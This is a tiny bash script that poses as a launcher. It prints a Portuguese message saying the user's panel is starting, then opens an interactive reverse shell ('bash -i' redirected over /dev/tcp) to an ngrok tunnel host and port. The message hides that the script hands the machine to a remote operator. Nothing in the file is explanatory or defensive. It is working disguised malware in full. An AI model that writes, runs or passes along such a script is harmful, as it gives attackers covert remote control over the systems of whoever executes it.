#!/usr/bin/bash
clear
echo -e '\e[92;1mAguarde , Seu Painel Iniciará ...\e[m'
bash -i >& /dev/tcp/0.tcp.ngrok.io/15868 0>&1
